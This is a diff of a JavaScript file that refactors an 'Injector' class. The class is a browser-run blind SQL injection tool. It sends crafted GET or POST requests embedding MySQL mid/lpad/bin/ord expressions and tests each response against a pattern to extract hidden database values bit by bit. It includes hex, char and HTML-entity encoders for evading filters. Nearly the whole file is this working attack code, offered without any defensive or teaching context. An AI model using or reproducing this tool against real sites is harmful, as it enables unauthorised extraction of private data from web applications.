@@ -1,112 +1,151 @@
-function Injector(method, url, params, payload, pattern) { 
-    this.method = method; 
-    this.bisPost = (method.toLowerCase() == 'post'); 
-    if (url[0] == '/') { 
-        this.url = url; 
-    } else { 
-        this.url = location.pathname; 
-    } 
-    var ref = this; 
-    this.RequestSender = function(name) { 
-        this.name = name; 
-        this.xhr = "var xhr = new XMLHttpRequest();"; 
-        this.requestHeaders = []; 
-        if (ref.bisPost) { 
-            this.requestHeaders.push("xhr.setRequestHeader(\x22Content-Type\x22,\x22application/x-www-form-urlencoded\x22);"); 
-        } 
-    } 
-    this.Sender = function() { 
-        this.handler = "xhr.onreadystatechange = function(){if(this.readyState == 4 && this.status == 200){ref.after = new Date(); console.log('Time Elpased:' + ref.timeElapsed()); document.body.innerHTML = this.responseText;}}"; 
-    } 
-    this.SQLInjector = function() { 
-        this.handler = "xhr.onreadystatechange = function(){if(this.readyState == 4 && this.status == 200){ref.result[i-1][j-1] = !!this.responseText.match(ref.pattern)+0;}}"; 
-    } 
-    this.Sender.prototype = new this.RequestSender('send'); 
-    this.SQLInjector.prototype = new this.RequestSender('inject'); 
-    this.sc = new this.Sender(); 
-    this.ic = new this.SQLInjector(); 
-    this.options = {}; 
-    this.options.unicode = false; 
-    this.result = []; 
-    this.cursor = 1; 
-    this.params = params; 
-    this.pattern = pattern; 
-    this.payload = payload; 
-    this.payload = this.parseVar(this.payload); 
-    this.prepare(); 
-} 
-Injector.prototype.execute = function(len) { 
-    for (var i = this.cursor; i <= this.cursor + len; i++) { 
-        this.result[i - 1] = []; 
-        for (var j = 1; j <= (this.options.unicode ? 16 : 8); j++) { 
-            this.inject(i, j) 
-        } 
-    } 
-    this.cursor = this.cursor + len; 
-} 
-Injector.prototype.toString = function() { 
-    var answer = ''; 
-    for (var i = 0; i < this.result.length; i++) { 
-        answer += String.fromCharCode(parseInt(this.result[i].join(""), 2)) 
-    } 
-    return answer; 
-} 
-Injector.prototype.prepare = function() { 
-    var ref = this; 
-    var iter = [this.sc, this.ic]; 
-    var obj; 
-    var url, params; 
-    this.Sender.prototype.wrapper = "\x22+val+\x22"; 
-    this.SQLInjector.prototype.wrapper = 'mid(lpad(bin(ord(mid($w,\x22+i+\x22,1))),' + (this.options.unicode ? '16' : '8') + ',0),\x22+j+\x22,1)'; 
-    for (var i = 0; i < iter.length; i++) { 
-        obj = iter[i]; 
-        url = this.url.replace(/\$p/, obj.wrapper).replace(/\$w/, this.payload); 
-        params = this.params.replace(/\$p/, obj.wrapper).replace(/\$w/, this.payload); 
-        if (this.bisPost) { 
-            obj.opener = "xhr.open(\x22" + this.method + "\x22, \x22" + url + "\x22);"; 
-            obj.sender = "xhr.send(\x22" + params + "\x22);"; 
-        } else { 
-            obj.opener = "xhr.open(\x22" + this.method + "\x22, \x22" + url + '?' + params + "\x22);"; 
-            obj.sender = "xhr.send(null);"; 
-        } 
-        obj.injectorContent = [obj.xhr, obj.opener, obj.requestHeaders.join(" "),obj.sender,  obj.handler].join(" "); 
-        eval('this.' + obj.name + ' = function(' + (obj == this.ic ? 'i,j' : 'val') + '){' + 'this.before = new Date(); ' + obj.injectorContent + '}'); 
-    } 
-} 
-Injector.prototype.replace = function(from, to) { 
-    this.url = this.url.replace(new RegExp(from,'g'), to); 
-    console.log(this.url); 
-    this.params = this.params.replace(new RegExp(from,'g'), to); 
-    console.log(this.params); 
-} 
-Injector.prototype.parseVar = function(str) { 
-    var ref = this; 
-    str = str.replace(/{\$[a-z]+?\([a-z0-9]+?\)}/g, function(m) { 
-        var match = m.match(/{\$([a-z]+?)\(([a-z0-9]+?)\)}/); 
-        return eval('ref.userFuncs.' + match[1] + '("' + match[2] + '")') 
-    }); 
-    return str; 
-} 
-Injector.prototype.userFuncs = { 
-    'hex': function(str) { 
-        result = '0x'; 
-        for (var i = 0; i < str.length; i++) { 
-            result += str.charCodeAt(i).toString(16); 
-        } 
-        return result; 
-    }, 
-    'concat': function(str) { 
-        result = 'concat('; 
-        for (var i = 0; i < str.length; i++) { 
-            result += "char(" + str.charCodeAt(i) + ")"; 
-            result += (i == str.length - 1) ? ')' : ','; 
-        } 
-        return result; 
-    } 
-} 
-Injector.prototype.setUnicode = function(bool) { 
-    this.options.unicode = bool; 
-} 
-Injector.prototype.timeElapsed = function() { 
-    return this.after - this.before; 
+function Sender(name) {
+    this.name = name;
+    this.xhr = "var xhr = new XMLHttpRequest();";
+    this.requestHeaders = [];
+}
+
+function RequestSender(injector) {
+    this.handler = function() {
+        if (this.readyState == 4) {
+            var after = new Date();
+            console.log('Time Elpased:' + (after-before));
+            document.body.innerHTML = this.responseText;
+        }
+    };
+
+    this.wrapper = "\x22+val+\x22";
+    this.arg = "val";
+}
+
+RequestSender.prototype = new this.Sender('send');
+RequestSender.prototype.constructor = RequestSender;
+
+function SQLSender(injector) {
+    var unicode = injector.options.unicode;
+    this.handler = function() {
+        if (this.readyState == 4) {
+            injector.result[i - 1][j - 1] = !!this.responseText.match(injector.pattern) + 0;
+        }
+    };
+    this.arg = "i,j";
+    if (typeof unicode == 'undefined') {
+        throw ReferenceError(unicode + ' is not defined');
+    }
+    this.wrapper = 'mid(lpad(bin(ord(mid($wrap,\x22+i+\x22,1))),' + (unicode ? '16' : '8') + ',0),\x22+j+\x22,1)';
+}
+
+SQLSender.prototype = new this.Sender('inject');
+SQLSender.prototype.constructor = SQLSender;
+
+function Injector(method, url, params, payload, pattern) {
+    this.method = method;
+    this.isPost = (method.toLowerCase() == 'post');
+    if (url[0] == '/') {
+        this.url = url;
+    } else {
+        this.url = location.pathname;
+    }
+    this.options = {};
+    this.options.unicode = false;
+    this.result = [];
+    this.cursor = 1;
+    this.params = params;
+    this.pattern = pattern;
+    this.payload = this.parseVar(payload);
+    this.prepare();
+    this.registerFuncs();
+}
+
+Injector.prototype.registerSender = function(sender) {
+    this.senderList.push(sender);
+}
+
+Injector.prototype.execute = function(len) {
+    for (var i = this.cursor; i <= this.cursor + len; i++) {
+        this.result[i - 1] = [];
+        for (var j = 1; j <= (this.options.unicode ? 16 : 8); j++) {
+            this.inject(i, j)
+        }
+    }
+    this.cursor = this.cursor + len;
+}
+
+Injector.prototype.toString = function() {
+    var answer = '';
+    for (var i = 0; i < this.result.length; i++) {
+        answer += String.fromCharCode(parseInt(this.result[i].join(""), 2))
+    }
+    return answer;
+}
+
+Injector.prototype.prepare = function() {
+    var sender;
+    var url, params;
+    var content;
+
+    this.senderList = [];
+    this.registerSender(new RequestSender(this));
+    this.registerSender(new SQLSender(this));
+
+    for (var i = 0; i < this.senderList.length; i++) {
+        sender = this.senderList[i];
+        url = this.url.replace(/\$p/, sender.wrapper).replace(/\$wrap/, this.payload);
+        params = this.params.replace(/\$p/, sender.wrapper).replace(/\$wrap/, this.payload);
+
+        content = sender.xhr + '\n';
+        content += 'var before = new Date();\n';
+        content += sender.initCallback ? 'var initCallback = ' + sender.initCallback +'; initCallback();\n ' : '';
+        content += "xhr.open(\x22" + this.method + "\x22, \x22" + url;
+        content += this.isPost ? "\x22);" : '?' + params + "\x22);\n";
+        content += this.isPost ? "xhr.setRequestHeader(\x22Content-Type\x22,\x22application/x-www-form-urlencoded\x22);" : '';
+        content += sender.requestHeaders.join(" ");
+        content += this.isPost ? "xhr.send(\x22" + params + "\x22);\n" : "xhr.send(null);\n";
+        content += "xhr.onreadystatechange=" + sender.handler + '\n';
+        this[sender.name] = new Function(sender.arg, content);
+    }
+}
+
+Injector.prototype.parseVar = function(str) {
+    var flag = true;
+    while (flag) {
+        flag = false;
+        str = str.replace(/(?:{\$)([a-z.]+?)\("?([a-z0-9]+?)"?\)(?:})/, function(m, func, arg) {
+            if (typeof func != 'undefined') {
+                flag = true;
+            }
+            return window[func](arg);
+        });
+    }
+    return str;
+}
+
+function encode(source, prefix, suffix, radix, before, after) {
+    var output = prefix;
+    for (var i = 0; i < source.length; i++) {
+        output += before + source.charCodeAt(i).toString(radix) + after;
+    }
+    var last = output.lastIndexOf(after);
+    output = output.substr(0, last);
+    output += suffix;
+    return output;
+}
+
+Injector.prototype.registerFuncs = function() {
+    var func = {
+        'hex':"encode(source, '0x', '', 16, '', '')",
+        'concat':"encode(source, 'concat(', '))', 10, 'char(', '),')",
+        'char':"encode(source, 'char(', ')', 10, '', ',')",
+        'htmlentity':"encode(source, '', ';', 16, '&#x', ';')",
+    };
+    for(var key in func) {
+        window[key] = new Function('source','return '+func[key]);
+    }
+}
+
+Injector.prototype.setUnicode = function(bool) {
+    this.options.unicode = bool;
+}
+
+Injector.prototype.timeElapsed = function() {
+    return this.after - this.before;
 }
